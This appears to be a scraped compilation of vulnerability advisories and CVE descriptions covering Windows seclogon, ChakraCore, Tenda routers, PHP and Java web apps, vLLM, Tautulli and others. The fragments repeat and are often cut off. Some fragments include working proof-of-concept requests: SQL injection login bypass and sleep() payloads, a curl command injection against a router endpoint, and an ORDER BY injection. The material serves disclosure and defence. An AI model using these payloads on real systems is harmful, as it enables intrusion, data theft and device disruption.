This function calls JavascriptArray::ForEachOwnMissingArrayIndexOfObject with the prototype of the object as a parameter, and if the prototype of the object is an array, it assumes that it is a Var array. While arrays are generally converted to var arrays if they are set as an object's prototype, if an object's prototype is a Proxy object, it can return a parent prototype that is a native int array. This can lead to type confusing, allowing an integer to be treated as an absolute pointer, when JavascriptArray::FillFromPrototypes is called.

This function calls JavascriptArray::ForEachOwnMissingArrayIndexOfObject with the prototype of the object as a parameter, and if the prototype of the object is an array, it assumes that it is a Var array. While arrays are generally converted to var arrays if they are set as an object's prototype, if an object's prototype is a Proxy object, it can return a parent prototype that is a native int array. This can lead to type confusing, allowing an integer to be treated as an absolute pointer, when JavascriptArray::FillFromPrototypes is called.

This can be used to elevate privileges to Local System.\n\nDescription:\n\nThe APIs CreateProcessWithToken and CreateProcessWithLogon are exposed to user applications, however they’re actually implemented in a system service, Secondary Logon. When these methods are called it’s actually dispatched over RPC to the service. \n\nBoth these methods take the normal STARTUPINFO structure and supports the passing of standard handles when the STARTF_USESTDHANDLES is used. Rather than the “standard” way of inheriting these handles to the new process the service copies them manually using the  SlpSetStdHandles function. This does something equivalent to:\n\nBOOL SlpSetStdHandles(HANDLE hSrcProcess, HANDLE hTargetProcess, HANDLE handles[]) {\n   foreach(HANDLE h : handles) {\n     DuplicateHandle(hSrcProcesss, h, hTargetProcess, &hNewHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);\n   }\n}\n\nThe vulnerability is nothing sanitizes these values. NtDuplicateObject special cases a couple of values for the source handle, Current Process (-1) and Current Thread (-2). NtDuplicateObject switches the thread’s current process to the target process when duplicating the handle, this means that while duplicating -1 will return a handle to the new process -2 will return a handle to the current thread which is actually a thread inside the svchost process hosting seclogon. When passing DUPLICATE_SAME_ACCESS for the current thread handle it's automatically given THREAD_ALL_ACCESS rights. The handle now exists in the new process and can be used by low privileged code.\n\nThis can be exploited in a number of ways. The new process can set the thread’s context causing the thread to dispatch to an arbitrary RIP. Or as these are thread pool threads servicing RPC requests for services such as BITS, Task Scheduler or seclogon itself you could do things like force a system level impersonation token (repeatedly) which overrides the security enforcement of these services leading to arbitrary file writes or process creation at Local System. It would be easy enough to run the exploit multiple times to capture handles to all thread pool threads available for RPC in the hosting process and then just keep trying until it succeeds.\n\nOne final point on exploitability. A normal user cannot use CreateProcessWithToken as the service checks that an arbitrary process can be opened by the user and has SeImpersonatePrivilege in its primary token. CreateProcessWithLogon will work but it seems you’d need to know a user’s password which makes it less useful for a malicious attacker. However you can specify the LOGON_NETCREDENTIALS_ONLY flag which changes the behaviour of LogonUser, instead of needing valid credentials the password is used to change the network password of a copy of the caller’s token. The password can be anything you like, it doesn’t matter.\n\nProof of Concept:\n\nI’ve provided a PoC as a C# source code file. You need to compile it with Any CPU support (do not set 32 bit preferred). The PoC must match the OS bitness. \n\n1) Compile the C# source code file.\n2) Execute the poc executable as a normal user. This will not work from low IL.\n3) The PoC should display a message box on error or success.\n\nExpected Result:\nThe call to CreateProcessWithLogon should fail and the PoC will display the error.\n\nObserved Result:\nThe process shows that it’s captured a handle from a service process.

Don't worry about modiyfing the payload length each time you change the payload as \nthis script will do it for you on the fly.\n\nNote: I tried to get a bash one liner reverse shell payload working but that did not work on my target for some reason.

    "description": "tautulli is a python based monitoring and tracking tool for plex media server. in tautulli v2.15.3 and earlier, an attacker with administrative access can use the `pms_image_proxy` endpoint to write arbitrary python scripts into the application filesystem. this leads to remote code execution when combined with the `script` notification agent. if an attacker with administrative access changes the url of the pms to a server they control, they can then abuse the `pms_image_proxy` to obtain a file write into the application filesystem. this can be done by making a `pms_image_proxy` request with a url in the `img` parameter and the desired file name in the `img_format` parameter. tautulli then uses a hash of the desired metadata together with the `img_format` in order to construct a file path. since the attacker controls `img_format` which occupies the end of the file path, and `img_format` is not sanitised, the attacker can then use path traversal characters to specify filename of their choosing. if the specified file does not exist, tautaulli will then attempt to fetch the image from the configured pms. since the attacker controls the pms, they can return arbitrary content in response to this request, which will then be written into the specified file. an attacker can write an arbitrary python script into a location on the application file system. the attacker can then make use of the built-in `script` notification agent to run the local script, obtaining remote code execution on the application server. users should upgrade to version 2.16.0 to receive a patch.",

The vulnerability exists in the `guestSsid` parameter of the `/goform/WifiGuestSet` interface. Remote attackers can exploit this vulnerability by sending oversized data to the `guestSsid` parameter, leading to denial of service (device crash) or potential remote code execution.\n\n# Vulnerability details\n\nThe buffer overflow occurs when an excessively long `guestSsid` value is stored without proper validation and later retrieved via `strcpy` into a fixed-size stack buffer during the `/goform/WifiGuestGet `request processing.

The vulnerability exists in the `guestSsid` parameter of the `/goform/WifiGuestSet` interface. Remote attackers can exploit this vulnerability by sending oversized data to the `guestSsid` parameter, leading to denial of service (device crash) or potential remote code execution.\n\n# Vulnerability details\n\nThe buffer overflow occurs when an excessively long `guestSsid` value is stored without proper validation and later retrieved via `strcpy` into a fixed-size stack buffer during the `/goform/WifiGuestGet `request processing. This direct copy operation without bounds checking enables stack corruption, leading to service crashes or potential code execution.\n\nRetrieve the guestSsid field, stored in the wl2g.ssidxx.ssid entry.\n\n![image-20251016205307988](images/image-20251016205307988.png)\n\nThe code used to obtain the guestSsid field is as follows:\n\n![image-20251016205352904](images/image-20251016205352904.png)\n\nIn the SetValue function for the guestSsid field, any string length less than 1499 can be stored in the corresponding entry.\n\n![image-20251016205445963](images/image-20251016205445963.png)\n\nSubsequently, when a user sends a POST request to `/goform/WifiGuestGet`, the corresponding `guestSsid` field is retrieved from this entry.\n\n![image-20251016205506364](images/image-20251016205506364.png)\n\nThen it proceeds directly to GetValue, where no length checks are performed before executing strcpy.\n\n![image-20251016205605004](images/image-20251016205605004.png)\n\nThe v45 variable here is the s pointer.

    "description": "elysia is a typescript framework for request validation, type inference, openapi documentation and client-server communication. versions 1.4.17 and below are subject to arbitrary code execution from cookie config. when dynamic cookies are enabled (e.g. there  an existing cookie schema), the cookie config is injected into the compiled route without first being sanitised. availability of this exploit is generally low, but when combined with ghsa-hxj9-33pp-j2cc, it allows for a full rce chain. an attack requires write access to either the elysia app's source code (in which case the vulnerability is meaningless) or write access to the cookie config (perhaps where it is assumed to be provisioned by the environment). this issue is fixed in version 1.4.18.",

    "description": "in the linux kernel, the following vulnerability has been resolved:\n\nbtrfs: fix use-after-free of new block group that became unused\n\nif a task creates a new block group and that block group becomes unused\nbefore we finish its creation, at btrfs_create_pending_block_groups(),\nthen when btrfs_mark_bg_unused() is called against the block group, we\nassume that the block group is currently in the list of block groups to\nreclaim, and we move it out of the list of new block groups and into the\nlist of unused block groups. this has two consequences:\n\n1) we move it out of the list of new block groups associated to the\n   current transaction. so the block group creation is not finished and\n   if we attempt to delete the bg because it's unused, we will not find\n   the block group item in the extent tree (or the new block group tree),\n   its device extent items in the device tree etc, resulting in the\n   deletion to fail due to the missing items;\n\n2) we don't increment the reference count on the block group when we\n   move it to the list of unused block groups, because we assumed the\n   block group was on the list of block groups to reclaim, and in that\n   case it already has the correct reference count. however the block\n   group was on the list of new block groups, in which case no extra\n   reference was taken because it's local to the current task. this\n   later results in doing an extra reference count decrement when\n   removing the block group from the unused list, eventually leading the\n   reference count to 0.\n\nthis second case was caught when running generic/297 from fstests, which\nproduced the following assertion failure and stack trace:\n\n  [589.559] assertion failed: refcount_read(&block_group->refs) == 1, in fs/btrfs/block-group.c:4299\n  [589.559] ------------[ cut here ]------------\n  [589.559] kernel bug at fs/btrfs/block-group.c:4299!\n  [589.560] invalid opcode: 0000 [#1] preempt smp pti\n  [589.560] cpu: 8 pid: 2819134 comm: umount tainted: g        w          6.4.0-rc6-btrfs-next-134+ #1\n  [589.560] hardware name: qemu standard pc (i440fx + piix, 1996), bios rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014\n  [589.560] rip: 0010:btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.561] code: 68 62 da c0 (...)\n  [589.561] rsp: 0018:ffffa55a8c3b3d98 eflags: 00010246\n  [589.561] rax: 0000000000000058 rbx: ffff8f030d7f2000 rcx: 0000000000000000\n  [589.562] rdx: 0000000000000000 rsi: ffffffff953f0878 rdi: 00000000ffffffff\n  [589.562] rbp: ffff8f030d7f2088 r08: 0000000000000000 r09: ffffa55a8c3b3c50\n  [589.562] r10: 0000000000000001 r11: 0000000000000001 r12: ffff8f05850b4c00\n  [589.562] r13: ffff8f030d7f2090 r14: ffff8f05850b4cd8 r15: dead000000000100\n  [589.563] fs:  00007f497fd2e840(0000) gs:ffff8f09dfc00000(0000) knlgs:0000000000000000\n  [589.563] cs:  0010 ds: 0000 es: 0000 cr0: 0000000080050033\n  [589.563] cr2: 00007f497ff8ec10 cr3: 0000000271472006 cr4: 0000000000370ee0\n  [589.563] dr0: 0000000000000000 dr1: 0000000000000000 dr2: 0000000000000000\n  [589.564] dr3: 0000000000000000 dr6: 00000000fffe0ff0 dr7: 0000000000000400\n  [589.564] call trace:\n  [589.564]  <task>\n  [589.565]  ? __die_body+0x1b/0x60\n  [589.565]  ? die+0x39/0x60\n  [589.565]  ? do_trap+0xeb/0x110\n  [589.565]  ? btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.566]  ? do_error_trap+0x6a/0x90\n  [589.566]  ? btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.566]  ? exc_invalid_op+0x4e/0x70\n  [589.566]  ? btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.567]  ? asm_exc_invalid_op+0x16/0x20\n  [589.567]  ? btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.567]  ? btrfs_free_block_groups+0x449/0x4a0 [btrfs]\n  [589.567]  close_ctree+0x35d/0x560 [btrfs]\n  [589.568]  ? fsnotify_sb_delete+0x13e/0x1d0\n  [589.568]  ? dispose_list+0x3a/0x50\n  [589.568]  ? evict_inodes+0x151/0x1a0\n  [589.568]  generic_shutdown_super+0x73/0x1a0\n  [589.569]  kill_anon_super+0x14/0x30\n  [589.569]  btrfs_kill_super+0x12/0x20 [btrfs]\n  [589.569]  deactivate_locked\n---truncated---",

    "description": "dragonfly is an open source p2p-based file distribution and image acceleration system. prior to 2.1.0, a peer can obtain a valid tls certificate for arbitrary ip addresses, effectively rendering the mtls authentication useless. the issue is that the manager’s certificate grpc service does not validate if the requested ip addresses “belong to” the peer requesting the certificate—that is, if the peer connects from the same ip address as the one provided in the certificate request. this vulnerability is fixed in 2.1.0.",

    "description": "urllib3 is a user-friendly http client library for python. starting in version 1.0 and prior to 2.6.0, the streaming api improperly handles highly compressed data. urllib3's streaming api is designed for the efficient handling of large http responses by reading the content in chunks, rather than loading the entire response body into memory at once. when streaming a compressed response, urllib3 can perform decoding or decompression based on the http content-encoding header (e.g., gzip, deflate, br, or zstd). the library must read compressed data from the network and decompress it until the requested chunk size is met. any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation. the decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. this can result in excessive resource consumption (high cpu usage and massive memory allocation for the decompressed data.",

Additionally, there are timing-based SQL injections, where attackers can leverage functions like SLEEP() to introduce intentional delays in database responses. This vulnerability enables attackers to extract sensitive information from the database and poses a significant risk to the security of the authentication system.\n\n![image-20250823013112177](image/image-20250823013112177.png)\n\n## POC\n\n```\nPOST /login.php HTTP/1.1\nHost: hris\nContent-Length: 31\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\nsave=1&user=1&pass=1'+or+'1'='1\n```\n\nSend this request, you can bypass authentication to gain access to the system.\n\n```\nPOST /login.php HTTP/1.1\nHost: hris\nContent-Length: 90\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\nsave=1&user=1&pass=1'+union+select+1,1,1,1,sleep(5)--+\n...\n"

The service only protects the `roleType` field (requiring administrator status for role changes), but it still lets the caller set `status`, `nickname`, `phone`, and `email`. A regular account can therefore disable administrator accounts or tamper with their metadata simply by posting another user’s ID.\n\n## Impact\n\n- Any authenticated user can disable other accounts, including administrators, by setting their status to “disabled”, effectively causing a denial of service for legitimate operators.

    "description": "vllm is an inference and serving engine for large language models (llms). prior to 0.11.1, vllm has a critical remote code execution vector in a config class named nemotron_nano_vl_config. when vllm loads a model config that contains an auto_map entry, the config class resolves that mapping with get_class_from_dynamic_module(...) and immediately instantiates the returned class. this fetches and executes python from the remote repository referenced in the auto_map string. crucially, this happens even when the caller explicitly sets trust_remote_code=false in vllm.transformers_utils.config.get_config. in practice, an attacker can publish a benign-looking frontend repo whose config.json points via auto_map to a separate malicious backend repo; loading the frontend will silently run the backend’s code on the victim host. this vulnerability is fixed in 0.11.1.",

    "description": "envoy is an open source l7 proxy and communication bus designed for large modern service oriented architectures. in versions below 1.32.10 and 1.33.0 through 1.33.6, 1.34.0 through 1.34.4 and 1.35.0, insufficient session expiration in the envoy oauth2 filter leads to failed logout operations. when configured with __secure- or __host- prefixed cookie names, the filter fails to append the required secure attribute to the set-cookie header during deletion. modern browsers ignore this invalid request, causing the session cookie to persist. this allows a user to remain logged in after they believe they have logged out, creating a session hijacking risk on shared computers. the current implementation iterates through the configured cookie names to generate deletion headers but does not check for these prefixes. this failure to properly construct the deletion header means the user's session cookies are never removed by the browser, leaving the session active and allowing the next user of the same browser to gain unauthorized access to the original user's account and data. this is fixed in versions 1.32.10, 1.33.7, 1.34.5 and 1.35.1.",

That stored value is later returned by `GET /goform/telnet` using `GetValue(\"lan.ip\", v3)`. Because neither `SetValue` nor `GetValue` enforce length or content constraints, an attacker-controlled `lan.ip` can carry shell metacharacters or payloads that lead to command execution when the value is used unsafely in a shell context.\n\n## Affected product & version\n\n- Product: Tenda AC7\n- Affected firmware: **V15.03.06.44**\n- Vendor download page: https://www.tenda.com.cn/product/download/AC7.html\n\n## Vulnerability details\n\n- **Endpoint (write):** `POST /goform/AdvSetLanip`\n\n  - Reads POST parameter `lanIp` into a buffer (`cp`).\n  - Calls `SetValue(\"lan.ip\", cp)` to persist the value.\n\n  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_092014.png)\n\n- **Endpoint (read):** `GET /goform/telnet`\n\n  - Calls `GetValue(\"lan.ip\", v3)` to retrieve the stored `lan.ip` value for later use.\n\n  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_092131.png)\n\n- **Root cause:** Missing validation and sanitization in both storage and retrieval paths. Arbitrary strings can be stored under `lan.ip`; if any consumer later interpolates this value into shell commands, scripts, or system calls without proper escaping, command injection becomes possible.\n\n## Poc\n\n1. Send a POST to `/goform/AdvSetLanip` with a malicious `lanIp` payload (e.g., including `;` or backticks).\n    Example (conceptual curl):\n\n   ```python\n   curl -s -X POST \"http://192.168.0.1/goform/AdvSetLanip\" \\\n     -d \"lanIp=192.168.0.1;reboot\"\n   ```\n\n   (Replace with appropriate parameter encoding for the target device.)\n\n2. Trigger or wait for code path that uses `lan.ip` in a shell context (e.g., via `GET /goform/telnet` or any maintenance script that runs the value). When that code concatenates or executes the value without escaping, the injected command runs.\n\n![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_092243.png)\n\n3.

Send a POST to `/goform/AdvSetLanip` with a malicious `lanIp` payload (e.g., including `;` or backticks).\n    Example (conceptual curl):\n\n   ```python\n   curl -s -X POST \"http://192.168.0.1/goform/AdvSetLanip\" \\\n     -d \"lanIp=192.168.0.1;reboot\"\n   ```\n\n   (Replace with appropriate parameter encoding for the target device.)\n\n2. Trigger or wait for code path that uses `lan.ip` in a shell context (e.g., via `GET /goform/telnet` or any maintenance script that runs the value). When that code concatenates or executes the value without escaping, the injected command runs.\n\n![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_092243.png)\n\n3. Successfully triggered attack\n\n![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_091337.png)\n\n...\n"

The reason for this issue is that attackers inject malicious code from the parameter \"dateto\" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.\n\n   ## Impact\n\n   - Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.\n\n   # DESCRIPTION\n\n   - During the security review of \"Advanced Library Management System\", discovered a critical SQL injection vulnerability in the \"borrowed_book_search.php\" file. This vulnerability stems from insufficient user input validation of the 'dateto' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.\n\n   # No login or authorization is required to exploit this vulnerability\n\n   # Vulnerability details and POC\n\n   ## Vulnerability type:\n\n   - time-based blind\n   - boolean-based blind\n...\n",

Although the code attempts to sanitize user input (`$name` and `$field`) using the `mysql_real_escape_string()` function, this defense mechanism is insufficient and inherently flawed, particularly because the program relies on the **deprecated and unsafe `mysql_\\*` extension**.\n\nThe code is vulnerable to **Wide-Byte Injection**. If the database connection is configured to use a multi-byte character set, such as **GBK** or **BIG5**, an attacker can prepend their malicious payload with a specific leading byte (e.g., `0xdf` in GBK).\n\nWhen `mysql_real_escape_string()` encounters a single quote (`'`), it prefixes it with a backslash (`\\`, or `0x5c`). The vulnerable database server, interpreting the payload as a multi-byte stream, combines the attacker's leading byte (`0xdf`) with the inserted backslash (`0x5c`) to form a new, valid, non-backslash multi-byte character. This effectively **consumes the backslash**, allowing the subsequent single quote to escape and close the SQL string prematurely, leading to injection.\n\n### Affected Code Snippets\n\n#### resources/functions/blog.php\n\n```\nfunction category_exists($field,$name){\n    $name = mysql_real_escape_string($name); // Wide-Byte Injection risk\n    $field = mysql_real_escape_string($field); // Column name injection risk\n    \n    $query = mysql_query(\"SELECT COUNT(1) FROM categories WHERE `{$field}` = '{$name}'\");\n    \n    return(mysql_result($query,0) == 0)?false : true;\n}\n```\n\nadd_category.php\n\n```\n<?php\ninclude_once('resources/init.php');\nif(isset($_POST['name'])){\n    $name = trim($_POST['name']);\n    \n    if(empty($name)){\n        $error = 'You must submit the category name';\n...\n",

Because the application intentionally exposes a configurable sort feature, no validation or whitelist exists. Any authenticated administrator can therefore inject SQL expressions that execute with the application's database privileges.\n\n## Component Overview\n- `com.jsnjfz.manage.core.common.constant.factory.PageFactory#defaultPage` (src/main/java/com/jsnjfz/manage/core/common/constant/factory/PageFactory.java:34-52)\n- `com.jsnjfz.manage.modular.system.controller.LogController#list` (src/main/java/com/jsnjfz/manage/modular/system/controller/LogController.java:69-76)\n- `com.jsnjfz.manage.modular.system.controller.LoginLogController#list` (src/main/java/com/jsnjfz/manage/modular/system/controller/LoginLogController.java:67-74)\n- `src/main/java/com/jsnjfz/manage/modular/system/dao/mapping/OperationLogMapper.xml:17-24`\n- `src/main/java/com/jsnjfz/manage/modular/system/dao/mapping/LoginLogMapper.xml:14-21`\n\nThese modules were designed to give administrators client-side control over table sorting. The `sort` parameter is passed untouched from the UI to the database layer to support arbitrary column ordering, which unintentionally allows SQL fragments to reach the database server.\n\n## Proof of Concept\n1. Log into the WebStack-Guns administrator console (default credentials in README: `admin/111111`).\n2. Request the operation log list with a malicious `sort` value:\n\n```\nGET /log/list?limit=10&offset=0&sort=(select%20sleep(5))%20--&order=asc HTTP/1.1\nHost: victim\nCookie: rememberMe=... (or session cookie)\n```\n\n3. The resulting SQL statement rendered by MyBatis becomes:\n\n```\nselect * from sys_operation_log ... order by (select sleep(5)) -- ASC\n```\n\n4. The database connection blocks for 5 seconds before returning the result, demonstrating successful injection. Replacing the payload with `(select database())` returns the current schema name inside the HTTP response. Similar payloads work against `/loginLog/list`.\n\n## Root Cause Analysis\n- `PageFactory.defaultPage` fetches `sort` and `order` directly from the HTTP request and stores them on the MyBatis `Page` object without filtering.\n- `LogController` and `LoginLogController` pass `page.getOrderByField()` to their respective mapper methods without checking the field names.\n- The MyBatis XML files embed `${orderByField}` inside `ORDER BY ${orderByField}` so the supplied string is concatenated into the SQL statement verbatim, bypassing prepared-statement protections.\n- No whitelist or mapping of approved column names exists, so crafted SQL is executed with the application's database credentials.\n\n## Impact\nAny authenticated administrator (or an attacker who compromised such an account) can achieve arbitrary SQL execution within the WebStack-Guns database. This enables dumping or tampering with all portal data, altering user passwords, and potentially impacting availability via time-based payloads. Because the project ships with publicly documented default administrator credentials, remote exploitation is likely on un-hardened deployments.\n\n## Recommended Remediation\n1. Replace `${orderByField}` with safe enum-based mappings. Define a server-side whitelist of sortable columns and translate user-provided identifiers to known column names before building SQL.\n...\n",
